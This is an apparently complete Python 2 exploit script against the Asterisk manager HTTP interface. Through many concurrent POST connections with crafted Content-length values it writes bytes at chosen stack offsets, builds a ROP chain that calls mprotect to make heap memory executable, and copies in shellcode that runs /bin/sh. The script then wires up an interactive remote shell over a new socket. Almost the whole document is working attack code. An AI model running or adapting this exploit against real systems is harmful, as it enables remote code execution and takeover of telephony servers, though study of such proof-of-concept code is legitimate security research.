#!/usr/bin/python
import socket
import time
import sys

SLEEP_TIME = 0.3

def new_conn():
  time.sleep(SLEEP_TIME)
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect( ("localhost", 8088) )
  return s

def send_header(s,content_length):
  time.sleep(SLEEP_TIME)
  header = ("POST /asterisk/manager HTTP/1.0\r\n"+
            "Host: localhost\r\n"+
            "Content-length: "+str(content_length)+"\r\n"+
            "\r\n")
  s.send(header)

def send_data(s, data):
  time.sleep(SLEEP_TIME)
  s.send(data)

def close_conn(s):
  time.sleep(SLEEP_TIME)
  s.close()

def spray_retaddr(offset, data=None):
  s = new_conn()
  send_header(s,offset)
  if data: send_data(s, data)
  close_conn(s)

def send_cmd(s, cmd, printMessage=True):
  s.send(cmd+'\n')
  #time.sleep(1)
  try:
    msg = s.recv(4096)
    if printMessage: print msg
  except socket.timeout, e:
    err = e.args[0]
    # this next if/else is a bit redundant, but illustrates how the
    # timeout exception is setup
    if err == 'timed out':
      print 'recv timed out, retry later'
    else:
      print 'e:', e
  except socket.error, e:
    print 'socket.error:', e

def spawn_writers(writers, offsets_to_write):
  num_wr = len(offsets_to_write)
  for i in range(len(offsets_to_write)):
    print "spawning writer (%d/%d)" % (i+1,num_wr)
    writers.append(new_conn())

def position_writers(writers, offsets_to_write, rop_offset, stacksize, frame_size):
  gap = 0x100
  num_wr = len(writers)
  for i in range(len(offsets_to_write)):
    #print "preparing writer [%X] (%d/%d)" % (i%6+10 + (i%6+10)*16,i+1,num_wr)
    print "preparing writer [%X] (%d/%d)" % (i%15+1 + (i%15+1)*16,i+1,num_wr)
    w = writers[i]
    o = offsets_to_write[num_wr-i-1] # will display the offsets nice in memory
    cnt = num_wr - i # multiply sizes with cnt to set them in right position
    send_header(w, stacksize * (cnt+1) + rop_offset + frame_size * cnt + gap)
                                # 1 extra thread that massages the ret addresses on the stack
    #send_data(w, ('%c' % (i%6+10 + (i%6+10)*16)) * (frame_size * (cnt-1) + gap + o[0] + 0x10)) 
    send_data(w, ('%c' % (i%15+1 + (i%15+1)*16)) * (frame_size * (cnt-1) + gap + o[0] + 0x10)) 
         # +0x10, fix offset, rop thread's RSP was 0x10 lower, so send 0x10 more bytes to fix offset 
  
  #raw_input("check stack of rop thread")
   
def do_offset_writes(writers, offsets_to_write):
  num_wr = len(writers)
  for i in range(len(offsets_to_write)):
    print "writing at offset (%d/%d)" % (i+1,num_wr)
    w = writers[i]
    o = offsets_to_write[num_wr-i-1]
    #w.send(o[1])
    send_data(w,o[1])
    i += 1

def do_attack():
  stacksize = 0x7c000
  rop_offset = 0x3e000 # ~offset(actually buffer size) in stack that will contain the rop chain
  frame_size = 208 # bytes
  writers = []
  offsets_to_write = [
    (0x008, '\x4d'),
    (0x010, '\x00\x00\x01' + '\x00'*21 + '\xa2'), # rsi, o.w. ret addr offset
    (0x058, '\x00\x00'), # modify heap buf ptr
    (0x068, '\x00'*8),
    (0x0a0, '\x00'*8),
    (0x0b0, '\x00\x00'), # modify heap buf ptr
    (0x0b8, '\x95'), 
    (0x0c0, '\x0f\x00'), # set heap buf ptr which gets written to the heap buf
    (0x0e8, '\x00\x00'), # modify heap buf ptr
    (0x0f8, '\x00'*8),
    (0x130, '\x0b' + '\x00'*7), # operand in syscall nr calculation
    (0x140, '\x08\x00'), # modify heap buf ptr
    (0x148, '\x95'),
    (0x150, '\x00'*4 + '\xff'*4 + '\x00'*32 + '\x00\x00'), # operand in sysc nr calc.& mod. heap buf ptr
    (0x188, '\x00'*8),
    (0x1b8, '\x00\x00'), # modify heap buf ptr
    (0x1c0, '\x00'*8),
    (0x1d0, '\x88\x00'), # modify heap buf ptr
    (0x1d8, '\x95'),
    (0x1e0, '\x07'+'\x00'*7 + '\x00'*32 + '\x00\x00'), # set RWX(0x7), mod. heap buf ptr
    (0x218, '\x00'*8),
    (0x260, '\x00\x00'), # modify heap buf ptr
    (0x268, '\x55'),
    (0x270, '\x00\x00'), # modify heap buf ptr
    (0x278, '\x5c'),
    (0x2a8, '\x4b'),
    (0x2d0, '\x00'*8),
    (0x2e0, '\x00\x00'),
    (0x2e8, '\x95'),
    (0x2f0, '\x31\xf6\xbf\x83\x00\x00\x00\xb8' + '\x00'*32 + '\x00\x00'), # part 1 of shellcode
    (0x328, '\x00'*8),
    (0x360, '\x00'*8),
    (0x370, '\x08\x00'),
    (0x378, '\x95'),
    (0x380, '\x21\x00\x00\x00\x0f\x05\xe8\x08' + '\x00'*32 + '\x00\x00'), # part 2 of shellcode
    (0x3b8, '\x00'*8),
    (0x3f0, '\x00'*8),
    (0x400, '\x10\x00'),
    (0x408, '\x95'),
    (0x410, '\x00\x00\x00\x2f\x62\x69\x6e\x2f' + '\x00'*32 + '\x00\x00'), # part 3 of shellcode
    (0x448, '\x00'*8),
    (0x480, '\x00'*8),
    (0x490, '\x18\x00'),
    (0x498, '\x95'),
    (0x4a0, '\x73\x68\x00\x31\xd2\x31\xf6\x5f' + '\x00'*32 + '\x00\x00'), # part 4 of shellcode
    (0x4d8, '\x00'*8),
    (0x510, '\x00'*8),
    (0x520, '\x20\x00'),
    (0x528, '\x95'),
    (0x530, '\xb8\x3b\x00\x00\x00\x0f\x05\x00' + '\x00'*32 + '\x00\x00'), # part 5 of shellcode
    (0x5b8, '\xb0'),
    (0x5c0, '\x08\x00')
  ]

  spawn_writers(writers, offsets_to_write)

  s2 = new_conn() # this gap/stack will be used in repeated connection creation and termination to spray ret addr
  s1 = new_conn() # used to exec ROP chain
  raw_input("rop thread started, check thread id")
  close_conn(s2) 

  position_writers(writers, offsets_to_write, rop_offset, stacksize, frame_size)
  raw_input("positioned writers")

  send_header(s1, rop_offset)

  ret_addr_sprays = [
    (+0x010, None), # (prepare intermediate state)
    (+0x0B0, '\0'), # set $rsi = size
    (-0x090, None), # place stack ptr
    (-0x080, None), # store stack ptr in heap
    (-0x110, None), # move 0x5 to heap, set 5 in rax which will be added to 5 in heap
    (-0x1A0, None), # store 0x7 (RWX) in heap
    (-0x240, None), # place heap ptr
    (-0x230, None), # set $rdi = mem addr
    (-0x280, None), # set $rdx = mem prot, $rax = syscall nr
    (-0x2B0, None), # call mprotect && copy part 1 of shellcode to heap buffer
    (-0x340, None), # copy part 2 of shellcode
    (-0x3D0, None), # copy part 3 of shellcode
    (-0x460, None), # copy part 4 of shellcode
    (-0x4F0, None), # copy part 5 of shellcode
    (-0x590, None), # place heap ptr
    (-0x580, None), # return to the shellcode in the heap
  ]

  num_massages = len(ret_addr_sprays)
  for i in range(num_massages):
    print "massaging return addresses (%d/%d)" % (i+1,num_massages)
    spray_retaddr(rop_offset + stacksize + ret_addr_sprays[i][0], ret_addr_sprays[i][1])

  raw_input("done massage")

  do_offset_writes(writers, offsets_to_write)

  raw_input("Check FD of next conn! Press Enter to create conn")
  s2 = new_conn() # will be used for interacting with the shell
  s2.settimeout(5)
  raw_input("Check FD of next conn! Check new FD!")

  raw_input("Press Enter to close connection s1 and start executing the rop chain")
  print "starting execution of rop chain"
  close_conn(s1)
  #s1.send('A'*7)
  #raw_input("check if sh has started")

  print "waiting to get shell"
  time.sleep(2)
  print "setting I/O of sh"
  send_cmd(s2,"exec 1<&0; exec 2<&1; echo ", False)

  cmd = None
  while True:
    cmd = raw_input("$ ")
    if cmd.strip() == "": 
      continue
    send_cmd(s2, cmd)
    if cmd == "quit":
      break

do_attack()
